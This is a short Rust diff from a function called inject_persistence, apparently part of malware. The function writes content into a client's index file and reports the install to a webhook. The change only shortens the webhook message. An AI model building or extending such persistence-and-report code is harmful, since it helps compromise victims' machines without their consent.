@@ -82,10 +82,7 @@ pub fn inject_persistence() {
 
         dump_to_file(&index_file, &to_dump);
 
-        network::send_webhook_message(&format!(
-            "installed persistence to {}",
-            index_file.display()
-        ));
+        network::send_webhook_message("installed client persistence");
     }
 }
 
